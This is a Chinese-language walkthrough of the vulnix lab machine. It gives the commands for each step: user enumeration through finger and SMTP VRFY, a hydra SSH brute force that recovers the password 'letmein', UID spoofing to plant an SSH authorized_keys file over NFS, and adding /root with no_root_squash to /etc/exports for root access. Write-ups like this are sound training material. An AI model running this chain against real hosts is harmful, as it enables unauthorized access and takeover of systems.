# vulnix



![image-20200612031806183](assets/vulnix.assets/image-20200612031806183.png)

看到nfs了先测试一下

![image-20200612095103606](assets/vulnix.assets/image-20200612095103606.png)

```bash
sudo mount -t nfs 192.168.1.115:/home/vulnix nfs
```

![image-20200612095156524](assets/vulnix.assets/image-20200612095156524.png)

![image-20200612095242901](assets/vulnix.assets/image-20200612095242901.png)

权限不足，需要为装成一个本地账户的UID才能读取



无权限，继续扫描

![image-20200612032402134](assets/vulnix.assets/image-20200612032402134.png)

finger：详细介绍可以参见我的`HTB_Sunday`的walkthrough

使用以下脚本

http://pentestmonkey.net/tools/user-enumeration/finger-user-enum

```bash
./finger-user-enum.pl -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t 192.168.43.122
```

大小字典都打了一下，没什么合适的线索。只确认了两个用户root和user

![image-20200612090201068](assets/vulnix.assets/image-20200612090201068.png)

![image-20200612085323977](assets/vulnix.assets/image-20200612085323977.png)

```bash
ehlo 192.168.1.115
```

Postfix邮件打招呼，发现支持VRFY命令。可以枚举用户名

```bash
smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 192.168.1.115
```

![image-20200612085946908](assets/vulnix.assets/image-20200612085946908.png)

再次认证了两个用户，root和user

hydra暴力测试ssh

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt -t 4 ssh://192.168.1.115
```

![image-20200612093149557](assets/vulnix.assets/image-20200612093149557.png)

```bash
user:letmein
```

![image-20200612095616871](assets/vulnix.assets/image-20200612095616871.png)

常规枚举发现sudo拥有S位。但是。user并在sudoer内

![image-20200612095706526](assets/vulnix.assets/image-20200612095706526.png)

利用usr账户查看可能利于的帐户

![image-20200612095810671](assets/vulnix.assets/image-20200612095810671.png)

推测nfs的权限也应该是这个帐户

参考`/etc/passwd`确认UID

![image-20200612095902404](assets/vulnix.assets/image-20200612095902404.png)

kali本地增加新用户

```bash
sudo useradd -u 2008 vulnix
```

重新进入挂载的nfs，但是并没有有用信息，

因为目录是远程的/home/vulnix，所以，可以利用ssh的特性在目录下生成ssh，从而让我们可以以vulnix的身份通过ssh进入目标。

```bash
mkdir .ssh
cd .ssh
ssh-keygen
```

![image-20200612111510521](assets/vulnix.assets/image-20200612111510521.png)	



```bash
mv id_rsa.pub authorized_keys
cat id_rsa
```

cat显示。将内容复制下来，在kali本机生成同样文件，记得给600

![image-20200612112030620](assets/vulnix.assets/image-20200612112030620.png)

使用私钥文件登录服务器

```bash
ssh -i id_rsa vulnix@192.168.1.115
```

![image-20200612112326383](assets/vulnix.assets/image-20200612112326383.png)

![image-20200612112822781](assets/vulnix.assets/image-20200612112822781.png)

执行这条命令可以编辑exports文件，这个文件是设置nfs挂载的，再最下面添加一行，吧/root也加入挂载

```bash
/root           *(no_root_squash,insecure,rw)
```

![image-20200612114900842](assets/vulnix.assets/image-20200612114900842.png)

之后需要重启目标。。

之后只是重复之前的步骤，挂载root，目录，为root生成密钥，ssh登录。